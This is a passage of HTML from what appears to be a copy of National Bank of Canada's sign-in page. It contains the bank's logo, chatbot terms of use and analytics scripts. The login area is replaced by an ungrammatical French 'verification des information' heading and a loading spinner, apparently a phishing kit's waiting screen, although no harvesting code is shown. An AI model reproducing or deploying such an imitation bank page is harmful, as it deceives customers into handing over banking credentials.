                                                            points="234.1 13.2 209.4 13.2 205.9 19.3 205.9 19.3 216.4 19.3 216.4 47.9 223.6 47.9 223.6 19.3 230.5 19.3">
                                                        </polygon>
                                                        <polygon class="logo-txt"
                                                            points="237 16.7 237 47.9 244.2 47.9 244.2 13.2 244.2 13.2">
                                                        </polygon>
                                                        <path class="logo-txt"
                                                            d="M265.7,12.3 C265.4,12.3 265,12.3 264.6,12.3 L252.6,18.2 C250.5,20.9 249,24.9 249,30.6 C249,46.9 261.1,48.9 265.7,48.9 C270.3,48.9 282.4,46.9 282.4,30.6 C282.3,14.2 270.2,12.3 265.7,12.3 Z M265.7,42.7 C261.8,42.7 256.3,40.3 256.3,30.6 C256.3,20.9 261.8,18.5 265.7,18.5 C269.6,18.5 275.1,20.9 275.1,30.6 C275.1,40.3 269.6,42.7 265.7,42.7 Z">
                                                        </path>
                                                        <polygon class="logo-txt"
                                                            points="308.6 16.5 308.6 37.4 308.5 37.4 294.7 13.2 287.1 16.9 287.1 47.9 293.9 47.9 293.9 23.1 294 23.1 308.1 47.9 315.4 47.9 315.4 13.2">
                                                        </polygon>
                                                        <polygon class="logo-txt"
                                                            points="380 41.6 362.7 41.6 362.7 13.2 355.5 16.7 355.5 47.9 376.4 47.9">
                                                        </polygon>
                                                        <path class="logo-txt"
                                                            d="M168.8,76 C170.2,75.3 173.1,73.9 173.1,68.9 C173.1,65.3 170.9,60 162.4,60 L152.8,60 L145.5,63.6 L145.5,94.7 L160.2,94.7 C167.3,94.7 169.2,93.5 171.2,91.6 C173,89.8 174.2,87.2 174.2,84.4 C174.1,81 173,77.6 168.8,76 Z M152.4,66 L160.7,66 C164,66 166,66.9 166,69.7 C166,72.5 163.7,73.6 160.9,73.6 L152.4,73.6 L152.4,66 L152.4,66 Z M161.3,88.7 L152.4,88.7 L152.4,79.4 L161.6,79.4 C164.2,79.4 166.8,80.6 166.8,83.6 C166.9,87.2 164.8,88.7 161.3,88.7 Z">
                                                        </path>
                                                        <polygon class="logo-txt"
                                                            points="232.5 63.3 232.5 84.2 232.4 84.2 218.6 60 211 63.8 211 94.7 217.8 94.7 217.8 70 217.9 70 232 94.7 239.3 94.7 239.3 60">
                                                        </polygon>
                                                        <path class="logo-txt"
                                                            d="M195.7,60 L195.7,60 L185.6,65 L175,94.7 L182.6,94.7 L185,87.5 L197.8,87.5 L200,94.7 L207.9,94.7 L195.7,60 Z M187,81.6 L191.4,67.9 L191.5,67.9 L195.8,81.6 L187,81.6 Z">
                                                        </path>
                                                        <polygon class="logo-txt"
                                                            points="275.2 60.1 263.9 62 252.6 74.2 252.6 60 245.3 63.6 245.3 94.7 252.6 94.7 252.6 83 256 79.5 266.7 94.7 276 94.7 261 74.2">
                                                        </polygon>
                                                    </g>
                                                </g>
                                            </svg></h1>
                                    </div><span class="bnc-brand__separator"></span>
                                    <div class="bnc-brand__tag">Powering your ideas</div>
                                </div>
                            </div>
                        </header>
                        <main>
                            <div id="loginForm" class="connect-form">
                                <div>
                                    <div class="" role="none">
                                        <h2 class="a11y-hide"> verification des information</h2>
                                        <h2 > verification des information</h2>
                                      <img src="../ajax-loading.gif" alt="" srcset="">

                                    </div>
                                </div>
                            </div>
                        </main>
                    </div>
                    <footer>
                        <div class="login-footer">
                            <div class="sign-up">
                                <h2 class="dsc-heading has-size02 sign-up__title" data-test="heading">First time signing
                                    in?</h2>
                                <p class="sign-up__message">Create your account to access all our online services with a
                                    single password.</p><button
                                    aria-label="Don’t have an account yet? Create your account to access all our online services with a single password."
                                    type="button" class="dsc-btn is-secondary" data-test="button">Create your
                                    account</button>
                            </div>
                        </div>
                    </footer>
                </section>
            </div>
            <div id="bnc-chatbot" class="chatbot-container">
                <div class="widget-about-container closed">
                    <div class="widget-about-container__header">
                        <div class="header__back-button" tabindex="0"><svg viewBox="0 0 64 64" width="24" height="24"
                                class="dsc-icon" fill="currentColor" focusable="false">
                                <title>Back</title>
                                <path
                                    d="M43.94 14.205L25.734 32.5 43.94 50.795a3.647 3.647 0 010 5.14 3.605 3.605 0 01-5.116 0L18.06 35.07a3.647 3.647 0 010-5.14L38.824 9.065a3.605 3.605 0 015.116 0 3.647 3.647 0 010 5.14z">
                                </path>
                            </svg></div>
                        <div class="header__title"><span>Terms of use</span></div>
                    </div>
                    <div class="widget-about-container__content" tabindex="0">
                        <div class="content__title"><span>National Bank’s virtual assistant</span></div>
                        <div class="content__text">
                            <p>When using our Virtual Assistant Service (the "Chatbot"), you accept these Terms of Use,
                                which are subject to change without notice. Furthermore, you agree to consult these
                                Terms of Use from time to time and acknowledge that your continuing use of the Chatbot
                                means that you have accepted any changes that may have been made. Your continued use of
                                the Chatbot means that you’ve read, understand and agree to these Terms of Use, <a
                                    href="https://www.nbc.ca/terms-of-use.html">the Terms of Use for our website, our
                                    Online transaction services</a>, and to our <a
                                    href="https://www.nbc.ca/privacy-policy.html">privacy policy</a>. You also
                                understand any other agreements that you have with us will continue to apply when you
                                use the Chatbot.</p>
                            <p><strong>1. Our Services and your responsibilities</strong></p>
                            <p>The Chatbot is an automated service which is integrated into our online banking platform.
                            </p>
                            <p>The Chatbot is preprogrammed to answer general questions concerning the use of our online
                                banking platform solely for informational purposes. The Chatbot is not able to answer
                                questions on personal monetary transactions or products you hold with us.</p>
                            <p>By using the Chatbot, you understand and agree that:</p>
                            <ul>
                                <li>The Chatbot does not provide financial advice or financial planning services.</li>
                                <li>The Chatbot does not conduct any banking transactions.</li>
                                <li>The Chatbot may not be able to answer all your questions. Therefore, it may not be
                                    able to provide you with the information you require. You must judge whether the
                                    answer provided responds to your question accurately. In the case of uncertainty, a
                                    customer service representative would be happy to help you. You can call us toll
                                    free at <a href="tel:+18884835628">1-888-483-5628</a> or <a
                                        href="tel:5143945555">514-394-5555</a>.</li>
                                <li>The Chatbot is not a complaint service. You cannot use the Chatbot to file
                                    complaints. If you have any complaints, you can contact us at the number indicated
                                    above.</li>
                                <li>We monitor, record and store the discussion that you have with the Chatbot to
                                    improve our interactions with our clients.</li>
                                <li>You will not provide the Chatbot with any confidential, personal, or private
                                    information. For example, you will not provide the Chatbot with your login
                                    information, PIN or other personal banking information.</li>
                            </ul>
                            <p><strong>2. Limitation of Liability</strong></p>
                            <p>You acknowledge that we won’t be liable for any losses or damages that you may suffer as
                                a result of your use of the Chatbot, including if the Chatbot is unavailable for any
                                reason.</p>
                            <p>We cannot guarantee that the results obtained via the Chatbot will be accurate and
                                reliable and that the answers provided will meet your expectations.</p>
                            <p>We will not be held liable for damages you incur as a result of:</p>
                            <ul>
                                <li>Any delay, error, interruption or omission on our part or any other event beyond our
                                    control.</li>
                                <li>Any deficiency or technical error or any unavailability of our systems and wireless
                                    networks.</li>
                                <li>Your failure to meet any of your obligations.</li>
                                <li>Any amendment to or suspension, refusal or blockage of the Chatbot.</li>
                                <li>Any decision or measure you take in response to information and data obtained via
                                    the Chatbot.</li>
                                <li>Any other damages you may incur that are not caused by negligence on our part.</li>
                            </ul>
                            <p><strong>3. Language</strong></p>
                            <p>You have requested that these Terms of Use, and related documents be drawn up in English.
                            </p>
                            <p><strong>4. Governing Law</strong></p>
                            <p>These Terms of Use are governed and must be interpreted in accordance with the laws in
                                force in the province or territory where you reside. If you reside outside Canada, the
                                laws in force and the courts of competent jurisdiction are those of the province of
                                Quebec.</p>
                        </div>
                    </div>
                </div>
                <div class="" style="">
                    <div class="rw-widget-container" role="region" aria-labelledby="chatbot">
                        <h2 id="chatbot" class="sr-only">Virtual assistant</h2><button type="button"
                            id="conversation-launcher" title="Virtual assistant" tabindex="0" class="rw-launcher">
                            <div class="rw-open-launcher__container"><img
                                    src="data:image/svg+xml,%3c%3fxml version='1.0' encoding='UTF-8'%3f%3e%3csvg width='64px' height='64px' viewBox='0 0 48 48' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3e %3c!-- Generator: Sketch 59 (86127) - https://sketch.com --%3e %3ctitle%3eGroup%3c/title%3e %3cdesc%3eCreated with Sketch.%3c/desc%3e %3cdefs%3e %3cfilter x='-98.2%25' y='-98.2%25' width='296.4%25' height='296.4%25' filterUnits='objectBoundingBox' id='filter-1'%3e %3cfeOffset dx='0' dy='0' in='SourceAlpha' result='shadowOffsetOuter1'%3e%3c/feOffset%3e %3cfeGaussianBlur stdDeviation='8' in='shadowOffsetOuter1' result='shadowBlurOuter1'%3e%3c/feGaussianBlur%3e %3cfeColorMatrix values='0 0 0 0 0.168627451 0 0 0 0 0.176470588 0 0 0 0 0.192156863 0 0 0 0.25 0' type='matrix' in='shadowBlurOuter1' result='shadowMatrixOuter1'%3e%3c/feColorMatrix%3e %3cfeMerge%3e %3cfeMergeNode in='shadowMatrixOuter1'%3e%3c/feMergeNode%3e %3cfeMergeNode in='SourceGraphic'%3e%3c/feMergeNode%3e %3c/feMerge%3e %3c/filter%3e %3c/defs%3e %3cg id='Layout' stroke='none' stroke-width='1' fill='none' fill-rule='evenodd'%3e %3cg id='Mobile---authentifi%c3%a9' transform='translate(-289.000000%2c -533.000000)'%3e %3cg id='buttons/circle/ghost-56' filter='url(%23filter-1)' transform='translate(296.000000%2c 527.000000)'%3e %3cg id='Group' transform='translate(-2.000000%2c 16.000000)'%3e %3cg id='Group-7' opacity='0.696614583' transform='translate(13.000000%2c 7.000000)' fill='%23EEF6FB'%3e %3cpath d='M4%2c-0.25 L19%2c-0.25 C21.3472102%2c-0.25 23.25%2c1.65278981 23.25%2c4 L23.25%2c13.9259259 C23.25%2c16.2731361 21.3472102%2c18.1759259 19%2c18.1759259 L4%2c18.1759259 C1.65278981%2c18.1759259 -0.25%2c16.2731361 -0.25%2c13.9259259 L-0.25%2c4 C-0.25%2c1.65278981 1.65278981%2c-0.25 4%2c-0.25 Z' id='Rectangle' stroke='%231572C5' stroke-width='0.5'%3e%3c/path%3e %3cpath d='M20.5%2c8.96296296 L25.4638326%2c17.8342079 C25.5668483%2c18.0183152 25.5741043%2c18.2409673 25.4832941%2c18.4313911 C25.328771%2c18.7554172 24.9408302%2c18.8928265 24.6168041%2c18.7383034 L18.1693563%2c16.1152868 L12.7093891%2c10.524276 L20.5%2c8.96296296 Z' id='Rectangle-8' transform='translate(19.127991%2c 13.882358) rotate(2.000000) translate(-19.127991%2c -13.882358) '%3e%3c/path%3e %3c/g%3e %3cg id='Group-2' fill='white' stroke='%231572C5' stroke-linejoin='round' stroke-width='0.88'%3e %3cpath d='M2.0500332%2c21.059127 L2.05005247%2c21.0591148 C1.49372368%2c21.4090218 0.759074428%2c21.2416839 0.409167443%2c20.6853551 C0.223297017%2c20.3898335 0.176572286%2c20.027599 0.281359407%2c19.6946105 L1.73212084%2c15.0834319 C1.70540569%2c14.8768491 1.69192353%2c14.6677846 1.69192353%2c14.4571429 L1.69192353%2c4.4 C1.69192353%2c1.72694181 3.85886534%2c-0.44 6.53192353%2c-0.44 L22.8652569%2c-0.44 C25.5383151%2c-0.44 27.7052569%2c1.72694181 27.7052569%2c4.4 L27.7052569%2c14.4571429 C27.7052569%2c17.130201 25.5383151%2c19.2971429 22.8652569%2c19.2971429 L6.53192353%2c19.2971429 C6.06384922%2c19.2971429 5.60439539%2c19.230556 5.16401259%2c19.1010168 L2.0500332%2c21.059127 Z M2.0500332%2c21.059127 L2.05001393%2c21.0591391 L2.0500332%2c21.059127 Z' id='Combined-Shape'%3e%3c/path%3e %3c/g%3e %3c/g%3e %3c/g%3e %3c/g%3e %3c/g%3e%3c/svg%3e"
                                    class="rw-open-launcher" alt=""></div>
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="/static/js/runtime-main.07c7ff32.js"></script>
    <script src="/static/js/2.f2353039.chunk.js"></script>
    <script src="/static/js/main.df661654.chunk.js"></script>
    <script type="text/javascript" src="/ytLwho6bKSgXrzuRBhZNRDm1BcE/fizuthpNQLEX/Q3xo/TlNnS1V4/MEE"></script>
    <script src="https://assets.adobedtm.com/4c6660b07da2/1dfcfc7fa8fc/launch-123dce461097.min.js"
        type="text/javascript" async=""></script>
    <style>
        @keyframes default-botfront-blinker-animation {
            0% {
                outline-color: rgba(0, 255, 0, 0);
            }

            49% {
                outline-color: rgba(0, 255, 0, 0);
            }

            50% {
                outline-color: green;
            }

            100% {
                outline-color: green;
            }
        }
    </style>
    <script>_satellite["_runScript1"](function (event, target, Promise) {
            // @documentation: https://stackoverflow.com/questions/1215392/how-to-quickly-and-conveniently-disable-all-console-log-statements-in-my-code
            window.analytics = window.analytics || {};
            window.analytics.logger = null;

            if (typeof (window.console) !== "undefined" && typeof (window.console.log) !== "undefined") {
                if (window.console.log() !== null) {
                    window.analytics.logger = console.log; //  built-in function
                    // localStorage.setItem("launch.console.log", console.log);
                }
            }

            window.analytics.enableLogger = function () {
                /*if (window.analytics.logger === null) {
                    if (typeof (window.localStorage) !== "undefined" && window.localStorage.getItem("launch.console.log") !== null)
                        if (typeof (window.localStorage.getItem("launch.console.log")) === "string")
                            window.analytics.logger = JSON.parse(window.localStorage.getItem("launch.console.log"));
                }*/

                if (window.analytics.logger === null)
                    return;

                window.console.log = window.analytics.logger;
            };

            /*if (typeof (window.localStorage) !== "undefined" && window.localStorage.getItem("com.adobe.reactor.debug") === "true") {
                if (typeof (window.console.log()) === "undefined" || window.console.log() !== null)
                    window.analytics.enableLogger(); // re-enable console.log on rewards.bnc.ca & app.bnc.ca when _satellite.setDebug(true);
            }*/
        });</script>
    <script>_satellite["_runScript2"](function (event, target, Promise) {
            window.analytics = window.analytics || {};
            window.analytics.webSDK = window.analytics.webSDK || {};
            window.analytics.webSDK.events = window.analytics.webSDK.events || {};

            // Option #1
            window.analytics.webSDK.setEventXDM = function (start_number, end_number, events_object) {
                if (typeof (events_object) === "undefined") {
                    if (window.analytics.webSDK.events)
                        events_object = window.analytics.webSDK.events;
                }

                if (start_number && end_number && start_number < end_number) {
                    var final_object = {};
                    var last_item_not_included = end_number + 1;

                    for (var i = start_number; i < last_item_not_included; i++) {
                        if (events_object[i] && events_object[i].value) {
                            var event_number = "event" + i;

                            final_object[event_number] = {};
                            final_object[event_number].value = events_object[i].value;
                        }
                    }
                    return final_object;
                }
            };

            // Option #2
            window.analytics.webSDK.setAllEventsXDM = function (events_object) {
                if (typeof (events_object) === "undefined") {
                    if (window.analytics.webSDK.events)
                        events_object = window.analytics.webSDK.events;
                }

                if (events_object) {

                    for (var event_number in events_object) {
                        if (events_object[event_number].value) {
                            if (event_number !== "" && event_number !== 0) {
                                var event_number_name = "event" + event_number;
                                var event_object = {};
                                event_object.value = events_object[event_number].value;

                                if (event_number > 0 && event_number < 101) {
                                    window.analytics.webSDK.events.event1to100 = window.analytics.webSDK.events.event1to100 || {};
                                    window.analytics.webSDK.events.event1to100[event_number_name] = event_object;
                                } else if (event_number < 201) {
                                    window.analytics.webSDK.events.event101to200 = window.analytics.webSDK.events.event101to200 || {};
                                    window.analytics.webSDK.events.event101to200[event_number_name] = event_object;
                                } else if (event_number < 301) {
                                    window.analytics.webSDK.events.event201to300 = window.analytics.webSDK.events.event201to300 || {};
                                    window.analytics.webSDK.events.event201to300[event_number_name] = event_object;
                                } else if (event_number < 401) {
                                    window.analytics.webSDK.events.event301to400 = window.analytics.webSDK.events.event301to400 || {};
                                    window.analytics.webSDK.events.event301to400[event_number_name] = event_object;
                                } else if (event_number < 501) {
                                    window.analytics.webSDK.events.event401to500 = window.analytics.webSDK.events.event401to500 || {};
                                    window.analytics.webSDK.events.event401to500[event_number_name] = event_object;
                                } else if (event_number < 601) {
                                    window.analytics.webSDK.events.event501to600 = window.analytics.webSDK.events.event501to600 || {};
                                    window.analytics.webSDK.events.event501to600[event_number_name] = event_object;
                                } else if (event_number < 701) {
                                    window.analytics.webSDK.events.event601to700 = window.analytics.webSDK.events.event601to700 || {};
                                    window.analytics.webSDK.events.event601to700[event_number_name] = event_object;
                                } else if (event_number < 801) {
                                    window.analytics.webSDK.events.event701to800 = window.analytics.webSDK.events.event701to800 || {};
                                    window.analytics.webSDK.events.event701to800[event_number_name] = event_object;
                                } else if (event_number < 901) {
                                    window.analytics.webSDK.events.event801to900 = window.analytics.webSDK.events.event801to900 || {};
                                    window.analytics.webSDK.events.event801to900[event_number_name] = event_object;
                                } else if (event_number < 1001) {
                                    window.analytics.webSDK.events.event901to1000 = window.analytics.webSDK.events.event901to1000 || {};
                                    window.analytics.webSDK.events.event901to1000[event_number_name] = event_object;
                                }
                            }
                        }
                    }

                    if (window.analytics.webSDK.events.event1to100)
                        _satellite.setVar("xdmEvent1to100Obj", window.analytics.webSDK.events.event1to100);

                    if (window.analytics.webSDK.events.event101to200)
                        _satellite.setVar("xdmEvent101to200Obj", window.analytics.webSDK.events.event101to200);

                    if (window.analytics.webSDK.events.event201to300)
                        _satellite.setVar("xdmEvent201to300Obj", window.analytics.webSDK.events.event201to300);

                    if (window.analytics.webSDK.events.event301to400)
                        _satellite.setVar("xdmEvent301to400Obj", window.analytics.webSDK.events.event301to400);

                    if (window.analytics.webSDK.events.event401to500)
                        _satellite.setVar("xdmEvent401to500Obj", window.analytics.webSDK.events.event401to500);

                    if (window.analytics.webSDK.events.event501to600)
                        _satellite.setVar("xdmEvent501to600Obj", window.analytics.webSDK.events.event501to600);

                    if (window.analytics.webSDK.events.event601to700)
                        _satellite.setVar("xdmEvent601to700Obj", window.analytics.webSDK.events.event601to700);

                    if (window.analytics.webSDK.events.event701to800)
                        _satellite.setVar("xdmEvent701to800Obj", window.analytics.webSDK.events.event701to800);

                    if (window.analytics.webSDK.events.event801to900)
                        _satellite.setVar("xdmEvent801to900Obj", window.analytics.webSDK.events.event801to900);

                    if (window.analytics.webSDK.events.event901to1000)
                        _satellite.setVar("xdmEvent901to1000Obj", window.analytics.webSDK.events.event901to1000);
                }
            };


            // example of window.analytics.webSDK.events
            /*
            window.analytics.webSDK.events = {
                1: {
                    value: 1, // number
                    name: "eventFormStepORAOOccupation", // string
                    id: "" // string
                },
                100: {
                    value: 1,
                    name: "eventFormStepEmortgageSubmitApplicationBackOffice",
                    id: ""
                },
                101: {
                    value: 1,
                    name: "eventFormStepORAOAddress",
                    id: ""
                }
            };
            
            */


            // Plan B
            window.analytics.webSDK.setEventsDataObj = function () {
                var web_sdk_data_elements_to_set_events_obj = _satellite.getVar("webSdkDataElementsToEventsObj");

                if (typeof (web_sdk_data_elements_to_set_events_obj) !== "undefined" && web_sdk_data_elements_to_set_events_obj !== null) {

                    for (var event_name in web_sdk_data_elements_to_set_events_obj) {
                        var event_value = _satellite.getVar(event_name);

                        if (event_value && event_value !== "" && event_value !== 0) {

                            if (web_sdk_data_elements_to_set_events_obj[event_name].number) {
                                var number_value = web_sdk_data_elements_to_set_events_obj[event_name].number;

                                if (number_value !== "" && number_value !== 0) {
                                    window.analytics.webSDK.events[number_value] = {};
                                    window.analytics.webSDK.events[number_value].value = event_value;
                                }
                            }
                        }
                    }
                }
            };
        });</script>
    <script>_satellite["_runScript3"](function (event, target, Promise) {
            // https://jira.bnc.ca/browse/SAFID-978
            window.analyticsData = window.analyticsData || {};
            window.analyticsData.query = window.analyticsData.query || {};

            analyticsData.query.adobeMcUrl = _satellite.getVar("adobe_mc_url");

            // PATCH Mispelling
            window.anayticsData = window.anayticsData || {};
            window.anayticsData.query = window.anayticsData.query || {};

            anayticsData.query.adobeMcUrl = _satellite.getVar("adobe_mc_url");
        });</script>
    <script>_satellite["_runScript4"](function (event, target, Promise) {
            if (typeof (_satellite.getVar("didomi_user_id")) === "undefined")
                _satellite.setVar("didomi_user_id", undefined); // make sure the variable is defined at least once

            var cookie_launch_didomi_user_id = _satellite.cookie.get("launch_didomi_user_id");

            if (typeof (cookie_launch_didomi_user_id) === "string" && cookie_launch_didomi_user_id !== "") {
                _satellite.setVar("didomi_user_id", cookie_launch_didomi_user_id); // take the value from the cookie
                _satellite.logger.log("fir didomi_user_id cookie: " + cookie_launch_didomi_user_id);
            } else {
                _satellite.logger.log("fir didomi_user_id cookie not set");
            }

            window.didomiOnReady = window.didomiOnReady || [];
            window.didomiOnReady.push(function (Didomi) {
                if (typeof (Didomi) !== "undefined" && typeof (Didomi.getUserStatus) !== "undefined") {
                    if (typeof (Didomi.getUserStatus().user_id) !== "undefined") {
                        _satellite.setVar("didomi_user_id", Didomi.getUserStatus().user_id); // take the value from Didomi functionality
                        _satellite.cookie.set("launch_didomi_user_id", Didomi.getUserStatus().user_id);
                        _satellite.logger.log("fir didomi_user_id didomiOnReady: " + _satellite.getVar("didomi_user_id"));
                    }
                }
            });
        });</script>
    <script>_satellite["_runScript5"](function (event, target, Promise) {
            /*
            // var regex = /(nbc.ca|bncd.ca|timetrade.ca|nbdb.ca|cdbn.ca)/gm;
            document.addEventListener("click", event => {
            
                var current_domain = location.hostname;
                var domain_parts = current_domain.split(".");
                var domain_parts_length = domain_parts.length;
                var current_page_naked_domain = "";
                if (domain_parts_length > 1)
                    current_page_naked_domain = domain_parts[domain_parts_length - 2] + "." + domain_parts[domain_parts_length - 1];
            
                window.anayticsData = window.anayticsData || {};
                window.anayticsData.query = window.anayticsData.query || {};
            
                const anchor = event.target.closest("a");
                if (!anchor || !anchor.href) {
                    return; // do nothing when no href
                }
                const current_link_url = new URL(anchor.href);
                var current_link_domain = current_link_url.hostname;
                if (current_link_domain.endsWith(current_page_naked_domain)) {
                    return; // do nothing when same top domain name
                }
                var current_link_domain_parts = current_link_domain.split(".");
                var current_link_domain_parts_length = current_link_domain_parts.length;
                var current_link_domain_naked_domain = "";
                if (current_link_domain_parts_length > 1)
                    current_link_domain_naked_domain = current_link_domain_parts[current_link_domain_parts_length - 2] + "." + current_link_domain_parts[current_link_domain_parts_length - 1];
            
                var internal_domains_list = _satellite.getVar("internal_domains_list");
                if (typeof (internal_domains_list) === "object" && internal_domains_list.join(",").indexOf(current_link_domain_naked_domain) === -1) {
                    return; // do nothing when the link domain is not listed in the internal domains list for example tel:, mailto:, facebook, twitter, youtube, linkedin, instagram
                }
            
                var finteltag_cookie_value = _satellite.getVar('fintelTagCookieValue');
                var finteltag_matching_values = {
                    fr: {
                        host: "bnc.ca",
                        regex: /(nbc\.ca|bncd\.ca|timetrade\.ca|nbdb\.ca|cdbn\.ca)/gm,
                        destination_regex: /app.bnc.ca\/bnc\/forms\/credit-card/gi
                    },
                    en: {
                        host: "nbc.ca",
                        regex: /(bnc\.ca|bncd\.ca|timetrade\.ca|nbdb\.ca|cdbn\.ca)/gm,
                        destination_regex: /(app.bnc.ca\/bnc\/forms\/credit-card|app\.bnc\.ca\/qd\/open|app.bnc.ca\/forms\/mortgage\/preauth)/gi
                    }
                }
            
                var finteltag_site_language_in_scope = "";
                if (current_page_naked_domain === finteltag_matching_values["fr"]["host"])
                    finteltag_site_language_in_scope = "fr";
                else if (current_page_naked_domain === finteltag_matching_values["en"]["host"])
                    finteltag_site_language_in_scope = "en";
            
                var finteltag_query = "";
                if (finteltag_site_language_in_scope !== "") {
                    var regex = finteltag_matching_values[finteltag_site_language_in_scope]["regex"];
                    var destination_regex = finteltag_matching_values[finteltag_site_language_in_scope]["destination_regex"];
                    if (current_link_url.href.match(regex) && current_link_url.href.match(destination_regex) && typeof (finteltag_cookie_value) !== "undefined")
                        finteltag_query = "finteltag=" + finteltag_cookie_value;
                }
            
                var append_query_adobe_mc = "&";
                if (current_link_url.search === "")
                    append_query_adobe_mc = "?";
            
                append_query_adobe_mc += (finteltag_query !== "" ? finteltag_query + "&" : ""); // append the finteltag if not empty
            
                anchor.href += append_query_adobe_mc + (typeof (anayticsData.query.adobeMcUrl) === "string" ? anayticsData.query.adobeMcUrl : "");
            });
            */
        });</script>
    <script>_satellite["_runScript6"](function (event, target, Promise) {
            window.analytics = window.analytics || {};
            window.analytics.google_consent_mode = window.analytics.google_consent_mode || {};

            window.analytics.google_consent_mode.setDefault = function (ad_storage_state, ad_personalization, ad_user_data, analytics_storage_state, url_passthrough, ads_data_redaction) {
                window.dataLayer = window.dataLayer || [];
                function gtag() { dataLayer.push(arguments); }

                ad_storage_state = ad_storage_state ? ad_storage_state : "denied";
                ad_personalization = ad_personalization ? ad_personalization : "denied";
                ad_user_data = ad_user_data ? ad_user_data : "denied";
                analytics_storage_state = analytics_storage_state ? analytics_storage_state : "denied";
                url_passthrough = url_passthrough ? url_passthrough : false;
                ads_data_redaction = ads_data_redaction ? ads_data_redaction : true;

                // Default ad_storage to 'denied' as a placeholder
                // Determine actual values based on your own requirements
                gtag('consent', 'default', {
                    'ad_storage': ad_storage_state,
                    'ad_personalization': ad_personalization,
                    'ad_user_data': ad_user_data,
                    'analytics_storage': analytics_storage_state,
                    'wait_for_update': 3000
                });
                gtag('set', 'url_passthrough', url_passthrough);
                gtag('set', 'ads_data_redaction', ads_data_redaction);
            }

            window.analytics.google_consent_mode.update = function (ad_storage_state, ad_personalization, ad_user_data, analytics_storage_state, url_passthrough, ads_data_redaction) {
                window.dataLayer = window.dataLayer || [];
                function gtag() { dataLayer.push(arguments); }

                ad_storage_state = ad_storage_state ? ad_storage_state : "denied";
                ad_personalization = ad_personalization ? ad_personalization : "denied";
                ad_user_data = ad_user_data ? ad_user_data : "denied";
                analytics_storage_state = analytics_storage_state ? analytics_storage_state : "denied";
                url_passthrough = url_passthrough ? url_passthrough : false;
                ads_data_redaction = ads_data_redaction ? ads_data_redaction : true;

                // No need to update ad_user_data and analytics_storage_state. It's been agreed that both will be set to 'denied' (which is specified when calling the setDefault() function) until further notice
                // If any of these 2 values need ot be updated in the future, just add them to the below gtag function and pass value when calling the function (granted/denied)
                gtag('consent', 'update', {
                    'ad_storage': ad_storage_state,
                    'ad_personalization': ad_personalization,
                    'ad_user_data': ad_user_data,
                    'analytics_storage': analytics_storage_state,
                });
            }

            window.analytics.google_consent_mode.setDefault("denied", "denied", "denied", "denied", false, true); //Initialize default values for consent mode
        });</script>
    <script>_satellite["_runScript7"](function (event, target, Promise) {
            var event_type = "", event_name = ""; "undefined" != typeof event && void 0 !== event.detail && (void 0 !== event.detail.event_type && (event_type = event.detail.event_type), void 0 !== event.detail.event_type && (event_name = event.detail.event_name)); var event_name2 = _satellite.getVar("event_name"), event_type2 = _satellite.getVar("event_type"), track_checkout_event_type = _satellite.getVar("track_checkout_event_type"), didomiVendorsConsent = _satellite.getVar("didomiVendorsConsent"), didomiVendorsConsentArray = []; "string" == typeof didomiVendorsConsent && (didomiVendorsConsentArray = didomiVendorsConsent.split(",")); var didomiVendorsConsentArrayLength = didomiVendorsConsentArray.length; if (window.analytics = window.analytics || {}, window.analytics.privacy = window.analytics.privacy || {}, "page_view" == event_type && "string" == typeof didomiVendorsConsent && (didomiVendorsConsent.match(/google-campaign-manager|google-ads/gi) ? didomiVendorsConsent.match(/google-campaign-manager/gi) && didomiVendorsConsent.match(/google-ads/gi) && window.analytics.google_consent_mode.update("granted", "granted", "granted", "denied") : window.analytics.google_consent_mode.update("denied", "denied", "denied", "denied")), "cancel" !== event_type) { event_name.match(/didomi-consent-changed/gi) || (_satellite.track("google_campaign_manager"), _satellite.track("google_ads")); for (var i = 0; i < didomiVendorsConsentArrayLength; i++)if (didomiVendorsConsentArray[i].match(/c:/gi)) { var vendorValues = didomiVendorsConsentArray[i].split(":"); if (2 === vendorValues.length) { var vendorValue = vendorValues[1], vendorName = vendorValue.replace(/-/g, "_").replace(/\s/g, "_"), regexToExclude = /google_campaign_manager|google_ads/gi; /trackEvent|trackPageView/.test(event_name) && (regexToExclude = /adobe_experience_platform|google_campaign_manager|google_ads/gi), "" === vendorName || regexToExclude.test(vendorName) || (_satellite.logger.log("eventToTrack:" + vendorName), _satellite.track(vendorName)) } } }
        });</script>
    <script>_satellite["_runScript8"](function (event, target, Promise) {
            var event_type = "", event_name = ""; "undefined" != typeof event && void 0 !== event.detail && (void 0 !== event.detail.event_type && (event_type = event.detail.event_type), void 0 !== event.detail.event_type && (event_name = event.detail.event_name)); var event_name2 = _satellite.getVar("event_name"), event_type2 = _satellite.getVar("event_type"), track_checkout_event_type = _satellite.getVar("track_checkout_event_type"), didomiVendorsConsent = _satellite.getVar("didomiVendorsConsent"), didomiVendorsConsentArray = []; "string" == typeof didomiVendorsConsent && (didomiVendorsConsentArray = didomiVendorsConsent.split(",")); var didomiVendorsConsentArrayLength = didomiVendorsConsentArray.length; if (window.analytics = window.analytics || {}, window.analytics.privacy = window.analytics.privacy || {}, "page_view" == event_type && "string" == typeof didomiVendorsConsent && (didomiVendorsConsent.match(/google-campaign-manager|google-ads/gi) ? didomiVendorsConsent.match(/google-campaign-manager/gi) && didomiVendorsConsent.match(/google-ads/gi) && window.analytics.google_consent_mode.update("granted", "granted", "granted", "denied") : window.analytics.google_consent_mode.update("denied", "denied", "denied", "denied")), "cancel" !== event_type) { event_name.match(/didomi-consent-changed/gi) || (_satellite.track("google_campaign_manager"), _satellite.track("google_ads")); for (var i = 0; i < didomiVendorsConsentArrayLength; i++)if (didomiVendorsConsentArray[i].match(/c:/gi)) { var vendorValues = didomiVendorsConsentArray[i].split(":"); if (2 === vendorValues.length) { var vendorValue = vendorValues[1], vendorName = vendorValue.replace(/-/g, "_").replace(/\s/g, "_"), regexToExclude = /google_campaign_manager|google_ads/gi; /trackEvent|trackPageView/.test(event_name) && (regexToExclude = /adobe_experience_platform|google_campaign_manager|google_ads/gi), "" === vendorName || regexToExclude.test(vendorName) || (_satellite.logger.log("eventToTrack:" + vendorName), _satellite.track(vendorName)) } } }
        });</script>
    <div id="extension-mmplj"></div>
    <script src="https://dam.bnc.ca/content/dam/tools/cmp/notice.js" type="text/javascript" token="bFXc6fFy"
        language="en" enabledidomi="true" async=""></script>
    <script>_satellite["_runScript9"](function (event, target, Promise) {
